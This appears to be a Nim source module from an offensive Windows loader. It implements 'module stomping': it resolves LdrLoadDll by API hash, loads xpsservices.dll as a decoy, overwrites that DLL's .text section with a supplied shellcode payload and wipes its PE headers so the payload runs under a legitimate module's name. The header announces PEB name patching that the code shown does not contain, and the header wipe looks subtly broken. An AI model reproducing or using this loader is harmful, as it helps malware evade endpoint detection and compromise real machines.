# stomp.nim — Module stomping + PEB name spoofing
#
# Strategy:
#   1. Load decoy DLL (xpsservices.dll) via LdrLoadDll
#   2. Find its .text section
#   3. Copy payload shellcode/PE into that section
#   4. Wipe PE headers of the stomped region
#   5. Patch PEB LDR_DATA_TABLE_ENTRY names

import winim
import defs, syscall, utils

type
  StompedRegion* = object
    textBase*: ptr byte
    textSize*: uint
    entry*:    ptr byte

const PE_HEADER_SIZE = 0x1000

const DECOY_NAME_W: array[15, uint16] = [
  uint16('x'), uint16('p'), uint16('s'), uint16('s'), uint16('e'),
  uint16('r'), uint16('v'), uint16('i'), uint16('c'), uint16('e'),
  uint16('s'), uint16('.'), uint16('d'), uint16('l'), uint16('l'),
]

proc loadDecoy(name: ptr UNICODE_STRING): ptr byte =
  # unsafe
  let ntdllH  = djb2(cast[seq[byte]]("ntdll.dll"))
  let ldrH    = djb2(cast[seq[byte]]("LdrLoadDll"))
  let ldrLoad = getProcFromPeb(ntdllH, ldrH)
  if ldrLoad == nil: return nil
  let ldrFn = cast[proc(path, flags: pointer, name: ptr UNICODE_STRING,
                         base: ptr ptr byte): NTSTATUS {.stdcall.}](ldrLoad)
  var base: ptr byte = nil
  let st = ldrFn(nil, nil, name, addr base)
  if NT_SUCCESS(st) and base != nil: base else: nil

proc findTextSection(base: ptr byte): (ptr byte, uint) =
  # unsafe — returns (nil, 0) on failure
  if cast[ptr uint16](base)[] != IMAGE_DOS_SIGNATURE:
    return (nil, 0)
  let eLfanew = uint(cast[ptr uint32](cast[uint](base) + 0x3C)[])
  let nt      = cast[uint](base) + eLfanew
  let fh      = cast[ptr IMAGE_FILE_HEADER](nt + 4)
  let optSz   = uint(fh[].SizeOfOptionalHeader)
  let n       = int(fh[].NumberOfSections)
  let sects   = cast[ptr IMAGE_SECTION_HEADER](
                  nt + 4 + uint(sizeof(IMAGE_FILE_HEADER)) + optSz)
  const textName: array[8, byte] = [
    byte('.'), byte('t'), byte('e'), byte('x'), byte('t'),
    0, 0, 0]
  for i in 0 ..< n:
    let s = cast[ptr IMAGE_SECTION_HEADER](
              cast[uint](sects) + uint(i) * uint(sizeof(IMAGE_SECTION_HEADER)))
    if s[].Name == textName:
      let sz = if s[].VirtualSize > 0: uint(s[].VirtualSize)
               else: uint(s[].SizeOfRawData)
      return (cast[ptr byte](cast[uint](base) + uint(s[].VirtualAddress)), sz)
  (nil, 0)

proc stomp*(payload: seq[byte]): (bool, StompedRegion) =
  # unsafe
  var decoyUs = UNICODE_STRING(
    Length:        uint16(DECOY_NAME_W.len * 2),
    MaximumLength: uint16(DECOY_NAME_W.len * 2),
    Buffer:        cast[ptr uint16](unsafeAddr DECOY_NAME_W[0]))

  let decoyBase = loadDecoy(addr decoyUs)
  if decoyBase == nil: return (false, StompedRegion())

  let (textPtr, textSize) = findTextSection(decoyBase)
  if textPtr == nil: return (false, StompedRegion())

  if uint(payload.len) > textSize: return (false, StompedRegion())

  let process = cast[HANDLE](uint(high(int)))  # NtCurrentProcess
  var base     = cast[pointer](textPtr)
  var sz       = uint(payload.len)
  var oldProt: uint32 = 0

  let stRw = ntProtectVirtualMemory(process, addr base, addr sz,
                                    PAGE_READWRITE, addr oldProt)
  if not NT_SUCCESS(stRw): return (false, StompedRegion())

  # Wipe PE headers
  let hdrWipe = min(PE_HEADER_SIZE, payload.len)
  zeroMem(decoyBase, hdrWipe)

  # Copy payload
  copyMem(textPtr, unsafeAddr payload[0], payload.len)

  # Restore RX
  var dummy: uint32 = 0
  discard ntProtectVirtualMemory(process, addr base, addr sz,
                                  PAGE_EXECUTE_READ, addr dummy)

  (true, StompedRegion(textBase: textPtr, textSize: textSize, entry: textPtr))
